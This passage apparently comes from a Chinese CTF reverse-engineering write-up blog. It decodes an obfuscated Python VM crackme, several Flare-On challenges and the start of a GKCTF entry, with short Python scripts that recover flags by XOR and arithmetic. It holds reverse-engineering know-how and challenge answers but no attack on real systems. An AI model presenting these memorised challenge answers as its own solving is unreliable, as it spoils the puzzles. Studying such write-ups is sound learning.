괠[亀[佤]] = 괠[亀[侰]] + 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa0\x80&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] ^ 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa0\xb3&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] - 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x83\x83&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] * 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa2\xaf&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] / 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa5\x87&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] &amp; 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xa7\xb3&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]] | 괠[亀[俴]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xb4\xa1&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[佤]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xab\x87&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 괠[亀[侰]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbc\x96&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 亀[侰]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xab\xbb&quot;</span>:</span><br><span class="line">            궓[亀[佤]] = 괠[亀[侰]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x94\x93&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 궓[亀[侰]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x8c\x92&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = 佤</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xac\x87&quot;</span>:</span><br><span class="line">            궓[亀[佤]] = 佤</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xac\x9f&quot;</span>:</span><br><span class="line">            괠[亀[佤]] = <span class="built_in">input</span>(괠[亀[侰]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbd\xba&quot;</span>:</span><br><span class="line">            궓[亀[佤]] = <span class="built_in">input</span>(괠[亀[侰]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x8f\xaf&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(괠[亀[佤]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xad\x97&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(궓[亀[佤]])</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xad\xbf&quot;</span>:</span><br><span class="line">            굴 = 괠[亀[佤]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xae\x93&quot;</span>:</span><br><span class="line">            굴 = 궓[亀[佤]]</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xae\xb3&quot;</span>:</span><br><span class="line">            굴 = 괣.pop()</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\xaf\x83&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] &gt; 괠[亀[俴]]:</span><br><span class="line">            굴 = 亀[佤]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbd\xb2&quot;</span>:</span><br><span class="line">            괠[<span class="number">7</span>] = 佤</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(괠[亀[佤]])):</span><br><span class="line">                <span class="keyword">if</span> 괠[亀[佤]] != 괠[亀[侰]]:</span><br><span class="line">                    괠[<span class="number">7</span>] = 侰</span><br><span class="line">                    굴 = 괠[亀[俴]]</span><br><span class="line">                    괣.append(굴)</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbe\xae&quot;</span>:</span><br><span class="line">            괢 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(괠[亀[佤]])):</span><br><span class="line">                괢 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(괠[亀[佤]][i]) ^ 괠[亀[侰]])</span><br><span class="line">            괠[亀[佤]] = 괢</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xea\xbf\x9a&quot;</span>:</span><br><span class="line">            괢 = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(괠[亀[佤]])):</span><br><span class="line">                괢 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(괠[亀[佤]][i]) - 괠[亀[侰]])</span><br><span class="line">            괠[亀[佤]] = 괢</span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x96\x87&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] &gt; 괠[亀[俴]]:</span><br><span class="line">            굴 = 괠[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x97\x8b&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] &gt; 괠[亀[俴]]:</span><br><span class="line">            굴 = 궓[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x98\xb7&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] == 괠[亀[俴]]:</span><br><span class="line">            굴 = 亀[佤]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x9a\xab&quot;</span> <span class="keyword">or</span> 괠[亀[侰]] == 괠[亀[俴]]:</span><br><span class="line">            굴 = 괠[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> 굸 == <span class="string">&quot;\xeb\x9d\x87&quot;</span> <span class="keyword">and</span> 괠[亀[侰]] == 괠[亀[俴]]:</span><br><span class="line">            굴 = 궓[亀[佤]]</span><br><span class="line">            괣.append(굴)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        굴 += 侰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">䯂(</span><br><span class="line">    [</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 佤, <span class="string">&quot;Authentication token: &quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbd\xba&quot;</span>, 佤, 佤],</span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;\xea\xbc\x96&quot;</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="string">&quot;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&quot;</span>,</span><br><span class="line">        ],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 俴, 俴 ** (<span class="number">3</span> * 俴 + 侰) - 俴 ** (俴 + 侰)],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, <span class="number">3</span>, 侰],</span><br><span class="line">        [<span class="string">&quot;\xeb\x83\x83&quot;</span>, 俴, 俴, <span class="number">3</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x89\x83&quot;</span>, 俴, 俴, <span class="number">4</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xb4\xa1&quot;</span>, 佤, 俴],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8c\x92&quot;</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbe\xae&quot;</span>, <span class="number">6</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 佤, <span class="string">&quot;Thanks.&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 侰, <span class="string">&quot;Authorizing access...&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8f\xaf&quot;</span>, 佤],</span><br><span class="line">        [<span class="string">&quot;\xeb\x94\x93&quot;</span>, 佤, 佤],</span><br><span class="line">        [<span class="string">&quot;\xea\xbe\xae&quot;</span>, 佤, 俴],</span><br><span class="line">        [<span class="string">&quot;\xea\xbf\x9a&quot;</span>, 佤, <span class="number">4</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, <span class="number">5</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbd\xb2&quot;</span>, 佤, <span class="number">6</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8f\xaf&quot;</span>, 侰],</span><br><span class="line">        [<span class="string">&quot;\xeb\x93\x83&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xea\xbc\x96&quot;</span>, 侰, <span class="string">&quot;Access denied!&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;\xeb\x8f\xaf&quot;</span>, 侰],</span><br><span class="line">        [<span class="string">&quot;\xeb\x93\x83&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>则分析如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VM(</span><br><span class="line">    [</span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, a, <span class="string">&quot;Authentication token: &quot;</span>],<span class="comment"># mov r[0], string1</span></span><br><span class="line">        [<span class="string">&quot;scanf&quot;</span>, a, a], <span class="comment"># get_input</span></span><br><span class="line">        [</span><br><span class="line">            <span class="string">&quot;mov&quot;</span>,</span><br><span class="line">            <span class="number">6</span>,</span><br><span class="line">            <span class="string">&quot;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&quot;</span>,</span><br><span class="line">        ], <span class="comment"># mov r[6], string2</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, c, c ** (<span class="number">3</span> * c + b) - c ** (c + b)], <span class="comment"># mov r[2], 120</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, <span class="number">4</span>, <span class="number">15</span>],<span class="comment"># mov r[4], 15</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, <span class="number">3</span>, b], <span class="comment"># mov r[3], 1</span></span><br><span class="line">        [<span class="string">&quot;mul&quot;</span>, c, c, <span class="number">3</span>], <span class="comment"># mul r[2], r[2], r[3] ; 120 * 1</span></span><br><span class="line">        [<span class="string">&quot;add&quot;</span>, c, c, <span class="number">4</span>], <span class="comment"># add r[2], r[2], r[4] 120 + 15 = 135</span></span><br><span class="line">        [<span class="string">&quot;movR&quot;</span>, a, c], <span class="comment"># mov r[0], r[2]</span></span><br><span class="line">        [<span class="string">&quot;setZero&quot;</span>, <span class="number">3</span>], <span class="comment"># mov r[3], 0</span></span><br><span class="line">        [<span class="string">&quot;xorS&quot;</span>, <span class="number">6</span>, <span class="number">3</span>], <span class="comment"># xor r[6], input, r[3] ; 输入异或0放入r[6]</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, a, <span class="string">&quot;Thanks.&quot;</span>], <span class="comment"># mov r[0], string3</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, b, <span class="string">&quot;Authorizing access...&quot;</span>],<span class="comment"># mov r[1], string4</span></span><br><span class="line">        [<span class="string">&quot;print&quot;</span>, a], <span class="comment"># print(&quot;Thanks.&quot;)</span></span><br><span class="line">        [<span class="string">&quot;movs&quot;</span>, a, a], <span class="comment"># movS r[0], input; 输入放入r[0]</span></span><br><span class="line">        [<span class="string">&quot;xorS&quot;</span>, a, c], <span class="comment"># xor r[0], r[0], r[2] ; r[0]中的字符串与r[2]中135进行异或</span></span><br><span class="line">        [<span class="string">&quot;subs&quot;</span>, a, <span class="number">4</span>], <span class="comment"># sub r[0], r[0], r[4] ; r[0]中的字符串减去r[4]中的15</span></span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, <span class="number">5</span>, <span class="number">19</span>], <span class="comment"># mov r[5], 19</span></span><br><span class="line">        [<span class="string">&quot;check&quot;</span>, a, <span class="number">6</span>, <span class="number">5</span>], <span class="comment"># 逐位校验</span></span><br><span class="line">        [<span class="string">&quot;print&quot;</span>, b],</span><br><span class="line">        [<span class="string">&quot;End&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;mov&quot;</span>, b, <span class="string">&quot;Access denied!&quot;</span>],</span><br><span class="line">        [<span class="string">&quot;print&quot;</span>, b],</span><br><span class="line">        [<span class="string">&quot;End&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>即<strong>将输入逐位异或135并减去15</strong></p><p>则解题脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;\xc3\xa1\xc3\x97\xc3\xa4\xc3\x93\xc3\xa2\xc3\xa6\xc3\xad\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9b\xc3\xa3\xc3\xa5\xc3\xa4\xc3\x89\xc3\x96\xc3\x93\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x96\xc3\x93\xc3\xa5\xc3\xa4\xc3\x89\xc3\x93\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x9b\xc3\x93\xc3\xa4\xc3\xa0\xc3\x99\xc3\x94\xc3\x89\xc3\x93\xc3\xa2\xc3\xa6\xc3\x89\xc3\xa0\xc3\x93\xc3\x9a\xc3\x95\xc3\x93\xc3\x92\xc3\x99\xc3\xa6\xc3\xa4\xc3\xa0\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa4\xc3\xa0\xc3\x93\xc3\x89\xc3\x9a\xc3\x93\xc3\xa1\xc3\x89\xc2\xb7\xc3\x94\xc3\xa2\xc3\x97\xc3\x9a\xc3\x95\xc3\x93\xc3\x94\xc3\x89\xc2\xb3\xc3\x9a\xc3\x95\xc3\xa6\xc3\xaf\xc3\xa8\xc3\xa4\xc3\x9f\xc3\x99\xc3\x9a\xc3\x89\xc3\x85\xc3\xa4\xc3\x97\xc3\x9a\xc3\x94\xc3\x97\xc3\xa6\xc3\x94\xc3\x89\xc3\x97\xc3\x9a\xc3\xaf\xc3\xa1\xc3\x97\xc3\xaf\xc3\xa5\xc3\x89\xc3\x9f\xc3\x89\xc3\x94\xc3\x99\xc3\x9a\xc3\xa4\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\xa0\xc3\x97\xc3\xa2\xc3\x93\xc3\x89\xc3\x97\xc3\x89\xc3\x91\xc3\x99\xc3\x99\xc3\x94\xc3\x89\xc3\xa2\xc3\x9f\xc3\x94\xc3\x89\xc3\x96\xc3\xa3\xc3\xa4\xc3\x89\xc3\x9f\xc3\x89\xc3\xa6\xc3\x93\xc3\x97\xc3\x9c\xc3\x9c\xc3\xaf\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\xa4\xc3\xa0\xc3\x9f\xc3\xa5\xc3\x89\xc3\xa5\xc3\x99\xc3\x9a\xc3\x91\xc3\x89\xc3\x9f\xc3\x89\xc3\xa0\xc3\x99\xc3\xa8\xc3\x93\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\x89\xc3\xa1\xc3\x9f\xc3\x9c\xc3\x9c\xc3\x89\xc3\x93\xc3\x9a\xc3\x9e\xc3\x99\xc3\xaf\xc3\x89\xc3\x9f\xc3\xa4\xc3\x89\xc3\x97\xc3\xa5\xc3\xa1\xc3\x93\xc3\x9c\xc3\x9c\xc2\x97\xc3\x89\xc3\xaf\xc3\x99\xc3\xa3\xc3\xa4\xc3\xa3\xc3\x96\xc3\x93\xc2\x9a\xc3\x95\xc3\x99\xc3\x9b\xc2\x99\xc3\xa1\xc3\x97\xc3\xa4\xc3\x95\xc3\xa0\xc2\xa9\xc3\xa2\xc2\xab\xc2\xb3\xc2\xa3\xc3\xaf\xc2\xb2\xc3\x95\xc3\x94\xc3\x88\xc2\xb7\xc2\xb1\xc3\xa2\xc2\xa8\xc3\xab&quot;</span>.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="comment"># 观察到\xc3\xc2为unicode码的标志, 故需要先解码</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag.append(((<span class="built_in">ord</span>(i) + <span class="number">15</span>) ^ <span class="number">135</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="FlareOn1-Shellolololol"><a href="#FlareOn1-Shellolololol" class="headerlink" title="[FlareOn1]Shellolololol"></a>[FlareOn1]Shellolololol</h3><ul><li>题目报毒2333333</li></ul><p>存在大量的XOR, 调试跟踪，在最后的地方找到flag对比</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104132336568.png" alt="image-20211104132336568"></p><h3 id="FlareOn6-Memecat-Battlestation"><a href="#FlareOn6-Memecat-Battlestation" class="headerlink" title="[FlareOn6]Memecat Battlestation"></a>[FlareOn6]Memecat Battlestation</h3><p>第一个code</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104133932238.png" alt="image-20211104133932238"></p><p>第二个code</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104133830727.png" alt="image-20211104133830727"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = [<span class="string">&#x27;\u0003&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\u001e&#x27;</span>, <span class="string">&#x27;\u0002&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    code.append(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(code))</span><br></pre></td></tr></table></figure><p>flag:<code>Kitteh_save_galixy@flare-on.com</code></p><h3 id="FlareOn6-FlareBear"><a href="#FlareOn6-FlareBear" class="headerlink" title="[FlareOn6]FlareBear"></a>[FlareOn6]FlareBear</h3><p>GDA打开，可以找到一个dancewithflag</p><p>通过交叉引用查到输出flag的要求为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mass == 72, happy == 30, clean == 0</span><br></pre></td></tr></table></figure><p>找到play,clean和feed, 分别如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Feed：</span><br><span class="line">mass += 10</span><br><span class="line">happy += 2</span><br><span class="line">clean -= 1</span><br><span class="line"></span><br><span class="line">PLAY:</span><br><span class="line">mass -= 2</span><br><span class="line">happy += 4</span><br><span class="line">clean -= 1</span><br><span class="line"></span><br><span class="line">CLEAN：</span><br><span class="line">mass += 0</span><br><span class="line">happy -= 1</span><br><span class="line">clean += 6</span><br></pre></td></tr></table></figure><p>直接解方程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 * feed + (-2) * play + 0 * clean == 72</span><br><span class="line">2 * feed + 4 * play + (-1) * clean == 30</span><br><span class="line">(-1) * feed + (-1) * play + 6 * clean == 0</span><br></pre></td></tr></table></figure><p>得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clean = 2, play = 4, feed = 8</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/1770991-20200806162905386-1449555399.png" alt="img"></p><h3 id="2019红帽杯-calc"><a href="#2019红帽杯-calc" class="headerlink" title="[2019红帽杯]calc"></a>[2019红帽杯]calc</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="GKCTF-2021-Crash"><a href="#GKCTF-2021-Crash" class="headerlink" title="[GKCTF 2021]Crash"></a>[GKCTF 2021]Crash</h3><p>Go语言程序，IDA 7.6打开</p><p>main函数校验flag格式</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104143403798.png" alt="image-20211104143403798"></p><p>进入main_check, 存在以下加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 